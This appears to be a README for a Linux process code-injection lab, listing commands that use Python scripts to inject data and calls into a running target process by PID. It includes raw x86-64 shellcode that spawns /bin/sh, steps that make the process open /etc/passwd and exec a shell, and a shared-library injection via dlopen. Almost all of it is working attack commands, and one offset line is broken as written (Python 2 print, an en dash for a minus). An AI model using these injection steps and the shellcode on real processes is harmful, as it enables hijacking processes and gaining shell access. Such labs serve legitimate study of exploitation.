To process injected program run:
gcc simple_loop.c -o simple_loop
./simple_loop
or
gcc simple_loop.c -ldl -o simple_loop_dl
./simple_loop_dl

To process code injection attacks run:
python3 alloc_pages.py -p $(pgrep simple_loop) -n 1 -d '/etc/passwd'
python3 call_openat.py -p $(pgrep simple_loop) -a $(printf "%d" 0x7f...)

python3 alloc_pages.py -p $(pgrep simple_loop) -n 1 -d $(echo -e '\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x48\xb9\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x51\xb0\x3b\x48\x89\xe7\x0f\x05')
python3 call_execve_via_addr.py -p $(pgrep simple_loop) -a $(printf "%d" 0x7f...)

python3 alloc_pages.py -p $(pgrep simple_loop) -n 1 -d '/proc'
python3 call_openat.py -p $(pgrep simple_loop) -a $(printf "%d" 0x7f...)

python3 alloc_pages.py -p $(pgrep simple_loop) -n 1 -d '/bin/sh'
python3 call_execve.py -p $(pgrep simple_loop) -a $(printf "%d" 0x7f...)

Note: to calculate the offset of the dlopen function run:
./dlopen_addr
dlopen address: 7fdae02cf390

cat /proc/$(pgrep dlopen_addr)/maps | grep libdl
7fdae02ce000-7fdae02cf000 r-xp ... /lib/x86_64-linux-gnu/libdl-2.31.so
...

python -c "print 'offset:', 0x7fdae02cf390 – 0x7fdae02ce000"
offset: 5008
Then insert this value into the offset variable in the call_execve_via_dl function in the code_injection.py script

Note: to build an injectable library run:
gcc -c -fPIC execve_sh_dl.c -o execve_sh_dl.o
gcc -shared execve_sh_dl.o -o execve_sh_dl.so

To process code injection attacks using shared library run:
python3 alloc_pages.py -p $(pgrep simple_loop_dl) -n 1 -d '/home/junior_ml_contest'
python3 call_openat.py -p $(pgrep simple_loop_dl) -a $(printf "%d" 0x7f...)

python3 alloc_pages.py -p $(pgrep simple_loop_dl) -n 1 -d './execve_sh_dl.so'
python3 ./call_execve_via_dl.py -p $(pgrep simple_loop_dl) -a $(printf "%d" 0x7f...)
